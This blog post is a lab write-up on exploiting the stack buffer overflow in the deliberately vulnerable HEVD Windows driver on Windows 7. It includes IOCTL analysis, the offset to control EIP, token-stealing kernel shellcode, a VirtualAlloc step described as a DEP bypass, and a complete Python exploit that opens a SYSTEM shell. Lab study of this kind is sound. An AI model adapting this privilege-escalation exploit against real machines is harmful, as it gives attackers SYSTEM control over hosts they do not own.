---
layout: post
title: "HEVD: Stack Buffer Overflow"
date: 2022-01-04 09:00:00 +0100
categories: [HEVD]
tags: [exploit, driver, x86, shellcode, kernel exploitation]
---


## <span class="myheader">Loading HEVD driver</span>

In this post we will be exploiting the Stack Overflow vulnerability in the [HEVD v3](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) driver. We're going to use Windows 7 SP1 as our target. To get better understanding of how drivers work in Windows, I recommend to read the previous blogpost where I explain some basic concepts.

To load the driver, we download first the pre-built executable from [here](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases) (or build it from source if you have too much time). Then, we download and run the [OSR Driver Loader](https://www.osronline.com/article.cfm%5earticle=157.htm) to load the driver in the debugee:

![OSR tool](/assets/img/osr_tool.png)
_OSR Driver Loader_

If all went well, we should see a new driver in the list of loaded modules:

![HEVD loaded](/assets/img/windbg_loaded_hevd.png)
_HEVD loaded in the debugee_

Red line marks memory address where the driver was loaded.


## <span class="myheader">Vulnerability</span>

Vulnerability exists in the [BufferOverflowStack.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/BufferOverflowStack.c) file, in the <code>TriggerBufferOverflowStack</code> function:

```c
#ifdef SECURE
        //
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");

        //
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        //

        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
```

Inspecting <code>else</code> condition, we notice that the <code>RtlCopyMemory</code> function copies full length of the supplied <code>UserBuffer</code> to the <code>KernelBuffer</code> leading to the stack buffer overflow vulnerability, as we are able to overwrite information on the stack and diverge the code execution from a current path to e.g. a shellcode. <code>Size</code> argument is not validated in any way and is equal to the size of the user supplied data:

```c
Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
```

In the <code>SECURE</code> version, this is taken care of as max length of the copied data is not larger than the <code>KernelBuffer</code> itself as specified by the <code>sizeof</code> operator. 

## <span class="myheader">Exploitation</span>

To exploit this vulnerability we need to make the driver code follow the correct execution flow and reach the vulnerable code. Below we can observe in IDA Pro what is the path we need to take:

![IDA Stack BO path](/assets/img/ida_stackbo_path.png)
*stack buffer overflow path in IDA Pro*

<code>DriverEntry</code> is the first piece of code called after a driver is loaded. In the code there is also <code>IrpDeviceIoCtlHandler</code> function defined that handles incoming IOCTL control codes inside IRP packets.
Based on the information in the packet, function will redirect execution to the appropriate IOCTL handler - <code>BufferOverflowStackIoCtlHandler</code> in this case - which is a wrapper for <code>TriggerBufferOverflowStack</code> that contains the vulnerable code as described in the 'Vulnerability' section above.

Our next task is to determine what IOCTL needs to be send to trigger the vulnerability.

### <span class="myheader">IOCTL</span>

Let's have a look at the source code first.
<br>
<code>IrpDeviceIoCtlHandler</code> function uses *switch* statement to transfer control to a correct handler, depending on the IOCTL received:

![IrpDeviceIoCtlHandler source code](/assets/img/code_IrpDeviceIoCtlHandler.png)
*source code of the IrpDeviceIoCtlHandler*

Driver will execute the <code>BufferOverflowStackIoctlHandler</code> function, in case of *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* value in the switch statement. *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* is a macro that corresponds to the IOCTL with 0x800 function code in it. So in order to trigger the vulnerability, we need to use 0x800 in the IOCTL creation. Other IOCTL sections are constant: *FILE_DEVICE_UNKNOWN, METHOD_NEITHER, FILE_ANY_ACCESS*

![IOCTL definitions](/assets/img/code_IOCTL_definitions.png)
*IOCTL definitions*

This is how the disassembled <code>IrpDeviceIoCtlHandler</code> function code looks in IDA:

![IrpDeviceIoCtlHandler](/assets/img/ida_stackbo_flow.png)
*switch statement and IOCTL handler*

<code>0x222003</code> is deducted from the IOCTL value held in ECX and the result is loaded into EAX register (1). If the difference is larger than <code>0x6C</code>, program jumps to a different part of code to return *"[-] Invalid IOCTL Code: "* message. It means there are 109 possible IOCTL codes that will be accepted by the program, in the range <code>0x222003 - 0x22206f</code>.

<br>

If the difference is smaller or equal to <code>0x6C</code>, the IOCTL is used in the *jmp* instruction to jump to the correct offset from the jump table (2). In the bottom of the picture, we see code at one of the offsets that calls <code>BufferOverflowStackIoctlHandler</code>(3).

<br>

To create IOCTLs, we can use online IOCTL decoder[^1] and provide all values in the given range to see which ones fit our needs. If we put the first value, 0x222003, we see that this is the correct IOCTL to trigger stack buffer overflow:

![Online IOCTL decoder](/assets/img/online_ioctl_decoder.png)
*online IOCTL decoder*

We can also create IOCTL values from scratch with some Python code. To do that, we need look up hex values of the IOCTL constants (e.g. [here](https://github.com/tandasat/WinIoCtlDecoder/blob/master/plugins/WinIoCtlDecoder.py)): 
+ FILE_DEVICE_UNKNOWN = 0x22 
+ METHOD_NEITHER = 0x3
+ FILE_ANY_ACCESS = 0x0

From the [Primer](https://wojtekgoo.github.io/posts/A_Primer_On_Windows_Drivers/#fnref:4) we know that we have to move *Device Type* to the 16th bit, *Required Access* to the 14th bit, *Function Code* to 2nd and *Transfer Type* to the end:

```python
ioctl = hex((0x22 << 16) | (0x0 << 14) | (0x800 << 2) | 0x3)
```

### <span class="myheader">Buffer Overflow</span>

With all the relevant information needed to trigger the vulnerability, we can build exploit. To develop exploit we will use <code>ctypes</code> library that allow Python code to call C functions and enable low-level memory manipulation.
<br>
To communicate, we need first to open a handle from userland to the target device using <code>CreateFile</code> API[^2], putting instead of file name name of the HEVD device, which we can get e.g. from the WinObj tool.

![Name of HEVD device](/assets/img/winobj_nameOfHevdDevice.png)
*device name in WinObj tool*

To send and receive messages to and from kernel driver, we can use <code>DeviceIoControl</code> API. Before we do that, we need to create proper IOCTL that will be dissected and understood by the HEVD device. We can use for that 

```python
import ctypes, sys, struct
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32

# open handle to the device
hevd = kernel32.CreateFileW(
    "\\\\.\\HackSysExtremeVulnerableDriver",    # file name
    0xC0000000,     # access: GENERIC READ | GENERIC WRITE, bits 30 and 31 are set
    0,                                          
    None,
    0x3,            # action to take on a device: OPEN EXISTING 
    0,
    None
)
    
if (not hevd) or (hevd == -1):
    print("[-] Failed to retrieve handle: " + str(GetLastError()))
    sys.exit(1)

# malicious payload
buf = "A" * 0x900
buf_size = len(buf)

# send message to the device
kernel32.DeviceIoControl(
    hevd,               # device handle
    0x222003,           # IOCTL
    buf,            
    buf_size,       
    None,
    0,
    byref(c_ulong()),
    None
)
```

In WinDbg, in the debugger machine, we enable printing debug messages and put breakpoint at <code>TriggerBufferOverflowStack</code> function to see what happens when we execute above code.

```c
ed Kd_DEFAULT_Mask 8
!sym noisy
.reload /f *.*
bp HEVD!TriggerBufferOverflowStack
```

If there are no debug messages printed in the WinDbg output, try to run below command on the debuggee:

```c
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter" /v DEFAULT /t REG_DWORD /d 0xf
```

When we execute the script, we can observe that our breakpoint is hit and return address is overwritten by our buffer. The driver printout states also that the *UserBuffer* size is 0x800 bytes only, but we copied there 0x900 bytes of the buffer,  modifying therefore the return address and causing crash

![BP triggered](/assets/img/windbg_bp_TriggerBufferOverflowStack.png)
![Buffer Overflow](/assets/img/windbg_stackBO.png)

Using e.g. *pattern_create* and *pattern_offset* tools from the Metasploit framework, we can find correct offset for EIP (2080 bytes):

```python
...
# malicious payload
buf = "A" * 2080 + "BBBB" + "C"*220
buf_size = len(buf)
...
```



![Buffer Overflow](/assets/img/windbg_correct_buffer_length.png)

Knowing the offset needed to control EIP, we can move on to the final exploit code.

### <span class="myheader">Exploit</span>

The HackSysTeam published sample token stealing payload that we can use for our needs[^3]:

```c++
pushad                               ; Save registers state

; Start of Token Stealing Stub
xor eax, eax                         ; Set ZERO
mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                     ; _KTHREAD is located at FS:[0x124]

mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

mov ecx, eax                         ; Copy current process _EPROCESS structure

mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

SearchSystemPID:
    mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
    sub eax, FLINK_OFFSET
    cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
    jne SearchSystemPID

mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                     ; with SYSTEM process nt!_EPROCESS.Token
; End of Token Stealing Stub

popad                                ; Restore registers state

; Kernel Recovery Stub
xor eax, eax                         ; Set NTSTATUS SUCCEESS
add esp, 12                          ; Fix the stack
pop ebp                              ; Restore saved EBP
ret 8                                ; Return cleanly
```

Comments are self-explanatory. The code replaces current's process token with the SYSTEM process token. If we execute then the Command Line, it'll run in the SYSTEM user context.
Above code has been translated into assembly e.g. [here](https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/):

```c++
shellcode = (
    b"\x60"                            # pushad
    b"\x31\xc0"                        # xor eax,eax
    b"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]

    b"\x8b\x40\x50"                    # mov eax,[eax+0x50]

    b"\x89\xc1"                        # mov ecx,eax

    b"\xba\x04\x00\x00\x00"            # mov edx,0x4

    b"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    b"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    b"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    b"\x75\xed"                        # jnz 0x1a
    
    b"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8] Get SYSTEM process nt!_EPROCESS.Token
    b"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx

    b"\x61"                            # popad  Restore registers state

    b"\x31\xc0"                        # xor eax,eax
    b"\x5d"                            # pop ebp
    b"\xc2\x08\x00"                    # ret 0x8
)
```

One last thing to take care of is the Data Execution Prevention[^4] security mechanism that would block our shellcode if we run it directly from the stack.
To bypass that, we could use e.g. VirtualAlloc function**[^5]** that will allocate an executable piece of memory for us:

```c++
# Bypass DEP and allocate executable memory for shellcode
va_ptr = kernel32.VirtualAlloc(
    c_int(0),                   # lpAddress
    c_int(len(shellcode)),      # dwSize
    c_int(0x3000),              # flAllocationType (MEM_COMMIT | MEM_RESERVE)
    c_int(0x40))                # flProtect (PAGE_EXECUTE_READWRITE)


# Move shellcode to the allocated memory
kernel32.RtlMoveMemory(
    c_int(va_ptr),              # Destination
    shellcode,                  # Source
    c_int(len(shellcode))       # Length
)
```

We are ready now to build the final shellcode, which looks like this:

```c++
import ctypes, sys, struct
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32

# open handle to the device
hevd = kernel32.CreateFileW(
    "\\\\.\\HackSysExtremeVulnerableDriver",    # file name
    0xC0000000,     # access: GENERIC READ | GENERIC WRITE, bits 30 and 31 are set
    0,                                          
    None,
    0x3,            # action to take on a device: OPEN EXISTING 
    0,
    None
)
    
if (not hevd) or (hevd == -1):
    print("[-] Failed to retrieve handle: " + str(GetLastError()))
    sys.exit(1)


shellcode = (
    b"\x60"                            # pushad
    b"\x31\xc0"                        # xor eax,eax
    b"\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]

    b"\x8b\x40\x50"                    # mov eax,[eax+0x50]

    b"\x89\xc1"                        # mov ecx,eax

    b"\xba\x04\x00\x00\x00"            # mov edx,0x4

    b"\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    b"\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    b"\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    b"\x75\xed"                        # jnz 0x1a
    
    b"\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8] Get SYSTEM process nt!_EPROCESS.Token
    b"\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx

    b"\x61"                            # popad  Restore registers state

    b"\x31\xc0"                        # xor eax,eax
    b"\x5d"                            # pop ebp
    b"\xc2\x08\x00"                    # ret 0x8
)


# Bypass DEP and allocate executable memory for shellcode
va_ptr = kernel32.VirtualAlloc(
    c_int(0),                   # lpAddress
    c_int(len(shellcode)),      # dwSize
    c_int(0x3000),              # flAllocationType (MEM_COMMIT | MEM_RESERVE)
    c_int(0x40))                # flProtect (PAGE_EXECUTE_READWRITE)


# Move shellcode to the allocated memory
kernel32.RtlMoveMemory(
    c_int(va_ptr),              # Destination
    shellcode,                  # Source
    c_int(len(shellcode))       # Length
)

payload = struct.pack("<L", va_ptr)

# evil buffer
buf = b"A"*2080 + payload
buf_size = len(buf)

# send message to the device
kernel32.DeviceIoControl(
    hevd,               # device handle
    0x222003,           # IOCTL
    buf,            
    buf_size,       
    None,
    0,
    byref(c_ulong()),
    None
)

Popen("start cmd", shell=True)
```

After execution, we get the Command Line as NT Authority\SYSTEM user:

![Command Line as SYSTEM](/assets/img/win7_shell.png)


## <span class="myheader">References<span>

[^1]: https://www.osronline.com/article.cfm%5earticle=229.htm
[^2]: https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
[^3]: https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Exploit/Payloads.c
[^4]: https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention
[^5]: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
